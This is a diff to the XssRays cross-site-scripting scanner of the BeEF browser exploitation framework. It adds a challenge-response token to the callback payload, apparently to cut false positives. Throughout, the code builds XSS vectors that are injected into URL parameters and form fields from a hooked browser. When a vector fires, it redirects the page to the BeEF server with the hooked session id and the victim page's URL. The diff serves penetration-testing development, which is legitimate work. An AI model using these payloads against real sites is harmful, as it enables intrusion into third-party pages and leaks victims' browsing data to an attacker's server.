@@ -30,6 +30,8 @@
  * XssRays 0.5.5 ported to BeEF by Michele "antisnatchor" Orru'
  * The XSS detection mechanisms has been rewritten from scratch: instead of using the location hash trick (that doesn't work anymore),
  * if the vulnerability is triggered the JS code vector will contact back BeEF.
+ * Each callback carries a challenge-response generated at execution time, so
+ * merely echoing or fetching the payload URL is not treated as an XSS hit.
  * Other aspects of the original code have been simplified and improved.
  * @namespace beef.net.xssrays
  */
@@ -296,6 +298,31 @@ beef.net.xssrays = {
     },
 
     /**
+     * Builds the callback used by every vector. The token is generated in the
+     * browser and the proof is the token reversed by JavaScript at runtime.
+     * A reflected URL or a passive resource request contains the expression,
+     * not its result, and is rejected by the server.
+     */
+    buildCallback: function(ray) {
+        var token = '';
+        var alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789';
+
+        do {
+            token = '';
+            for (var i = 0; i < 32; i++) {
+                token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+            }
+        } while (token === token.split('').reverse().join(''));
+
+        var proofExpression = "('" + token + "').split('').reverse().join('')";
+        return "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession
+            + "&raysid=" + this.xssraysScanId + "&action=ray"
+            + "&rt=" + token + "&rp='+(" + proofExpression + ")+'"
+            + "&p='+window.location.href+'"
+            + "&n=" + encodeURIComponent(ray.vector.name) + "&m=" + ray.vector.method + "'";
+    },
+
+    /**
      * this is the main core function with the detection mechanisms...
      * @param url 
      * @param method 
@@ -343,9 +370,7 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                        beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
-
+                        beefCallback = this.buildCallback(ray);
                         exploit = vector.input.replace(/XSS/g, beefCallback);
 
                         if(beef.browser.isC() || beef.browser.isS()){ //we will base64 the whole uri later
@@ -370,9 +395,7 @@ beef.net.xssrays = {
                 beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                 beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                    + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
-
+                beefCallback = this.buildCallback(ray);
                 exploit = vector.input.replace(/XSS/g, beefCallback);
 
                 //TODO: if the url is something like example.com/?param=1 then a second slash will be added, like example.com//<xss>.
@@ -426,9 +449,7 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
-
+                        beefCallback = this.buildCallback(ray);
                         exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                         form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
                         beef.debug("form param[" + i + "] = " + params[i].toString());
